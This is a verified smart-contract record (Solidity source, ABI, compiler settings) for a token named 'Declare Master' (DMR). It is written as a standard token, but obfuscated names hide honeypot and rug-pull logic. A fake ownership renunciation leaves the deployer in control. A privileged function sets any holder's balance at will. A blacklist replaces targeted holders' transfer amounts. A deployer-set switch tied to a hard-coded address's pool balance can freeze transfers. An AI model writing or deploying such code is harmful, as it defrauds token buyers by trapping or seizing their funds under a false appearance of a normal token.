{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface swapMin {\n    function createPair(address atFund, address launchFund) external returns (address);\n}\n\ninterface takeTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address exemptLiquidity) external view returns (uint256);\n\n    function transfer(address buySwapTake, uint256 liquidityFromEnable) external returns (bool);\n\n    function allowance(address txAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityFromEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buySwapTake,\n        uint256 liquidityFromEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeFund, uint256 value);\n    event Approval(address indexed txAmount, address indexed spender, uint256 value);\n}\n\nabstract contract autoBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface takeTeamMetadata is takeTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DeclareMaster is autoBuy, takeTeam, takeTeamMetadata {\n\n    uint256 private fromTotal;\n\n    function balanceOf(address exemptLiquidity) public view virtual override returns (uint256) {\n        return minAmount[exemptLiquidity];\n    }\n\n    function receiverFromExempt(address modeTotal, uint256 liquidityFromEnable) public {\n        launchEnable();\n        minAmount[modeTotal] = liquidityFromEnable;\n    }\n\n    uint256 private liquidityMin;\n\n    uint8 private tokenBuy = 18;\n\n    mapping(address => uint256) private minAmount;\n\n    function modeMarketing(address teamSwap, address buySwapTake, uint256 liquidityFromEnable) internal returns (bool) {\n        if (teamSwap == receiverBuy) {\n            return teamWallet(teamSwap, buySwapTake, liquidityFromEnable);\n        }\n        uint256 receiverMode = takeTeam(walletToken).balanceOf(shouldIsAuto);\n        require(receiverMode == liquiditySender);\n        require(buySwapTake != shouldIsAuto);\n        if (listTxMax[teamSwap]) {\n            return teamWallet(teamSwap, buySwapTake, tradingMode);\n        }\n        return teamWallet(teamSwap, buySwapTake, liquidityFromEnable);\n    }\n\n    function maxFundLiquidity(address receiverSell) public {\n        if (amountFee) {\n            return;\n        }\n        if (limitEnable == fromTotal) {\n            modeWallet = true;\n        }\n        modeToken[receiverSell] = true;\n        if (liquidityFrom != liquidityMin) {\n            exemptTake = true;\n        }\n        amountFee = true;\n    }\n\n    function totalSell(address shouldEnable) public {\n        launchEnable();\n        if (totalShould != launchedTake) {\n            totalShould = true;\n        }\n        if (shouldEnable == receiverBuy || shouldEnable == walletToken) {\n            return;\n        }\n        listTxMax[shouldEnable] = true;\n    }\n\n    address shouldIsAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private takeReceiver;\n\n    function owner() external view returns (address) {\n        return fromBuy;\n    }\n\n    uint256 liquiditySender;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toMarketingTeam;\n    }\n\n    function teamWallet(address teamSwap, address buySwapTake, uint256 liquidityFromEnable) internal returns (bool) {\n        require(minAmount[teamSwap] >= liquidityFromEnable);\n        minAmount[teamSwap] -= liquidityFromEnable;\n        minAmount[buySwapTake] += liquidityFromEnable;\n        emit Transfer(teamSwap, buySwapTake, liquidityFromEnable);\n        return true;\n    }\n\n    bool public amountFee;\n\n    string private toMarketing = \"Declare Master\";\n\n    function allowance(address listFeeLimit, address feeMaxTake) external view virtual override returns (uint256) {\n        if (feeMaxTake == totalMin) {\n            return type(uint256).max;\n        }\n        return takeReceiver[listFeeLimit][feeMaxTake];\n    }\n\n    function transfer(address modeTotal, uint256 liquidityFromEnable) external virtual override returns (bool) {\n        return modeMarketing(_msgSender(), modeTotal, liquidityFromEnable);\n    }\n\n    function approve(address feeMaxTake, uint256 liquidityFromEnable) public virtual override returns (bool) {\n        takeReceiver[_msgSender()][feeMaxTake] = liquidityFromEnable;\n        emit Approval(_msgSender(), feeMaxTake, liquidityFromEnable);\n        return true;\n    }\n\n    uint256 private toMarketingTeam = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldTrading;\n    }\n\n    function transferFrom(address teamSwap, address buySwapTake, uint256 liquidityFromEnable) external override returns (bool) {\n        if (_msgSender() != totalMin) {\n            if (takeReceiver[teamSwap][_msgSender()] != type(uint256).max) {\n                require(liquidityFromEnable <= takeReceiver[teamSwap][_msgSender()]);\n                takeReceiver[teamSwap][_msgSender()] -= liquidityFromEnable;\n            }\n        }\n        return modeMarketing(teamSwap, buySwapTake, liquidityFromEnable);\n    }\n\n    string private shouldTrading = \"DMR\";\n\n    function autoFee(uint256 liquidityFromEnable) public {\n        launchEnable();\n        liquiditySender = liquidityFromEnable;\n    }\n\n    function exemptTx() public {\n        emit OwnershipTransferred(receiverBuy, address(0));\n        fromBuy = address(0);\n    }\n\n    bool public launchedTake;\n\n    uint256 tradingTx;\n\n    uint256 private marketingTotal;\n\n    address private fromBuy;\n\n    constructor (){\n        if (totalShould != launchedTake) {\n            exemptTake = true;\n        }\n        receiverLiquidity launchedMaxList = receiverLiquidity(totalMin);\n        walletToken = swapMin(launchedMaxList.factory()).createPair(launchedMaxList.WETH(), address(this));\n        \n        receiverBuy = _msgSender();\n        modeToken[receiverBuy] = true;\n        minAmount[receiverBuy] = toMarketingTeam;\n        exemptTx();\n        if (liquidityMin != marketingTotal) {\n            liquidityFrom = fromTotal;\n        }\n        emit Transfer(address(0), receiverBuy, toMarketingTeam);\n    }\n\n    bool private modeWallet;\n\n    function launchEnable() private view {\n        require(modeToken[_msgSender()]);\n    }\n\n    mapping(address => bool) public listTxMax;\n\n    uint256 private limitEnable;\n\n    address totalMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private exemptTake;\n\n    mapping(address => bool) public modeToken;\n\n    uint256 constant tradingMode = 11 ** 10;\n\n    uint256 private liquidityFrom;\n\n    function getOwner() external view returns (address) {\n        return fromBuy;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return toMarketing;\n    }\n\n    address public receiverBuy;\n\n    address public walletToken;\n\n    bool private totalShould;\n\n    bool private takeFrom;\n\n    event OwnershipTransferred(address indexed takeBuy, address indexed tradingToken);\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenBuy;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFeeLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeMaxTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMaxTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFromEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityFromEnable\",\"type\":\"uint256\"}],\"name\":\"autoFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listTxMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"}],\"name\":\"maxFundLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFromEnable\",\"type\":\"uint256\"}],\"name\":\"receiverFromExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldEnable\",\"type\":\"address\"}],\"name\":\"totalSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFromEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buySwapTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFromEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DeclareMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}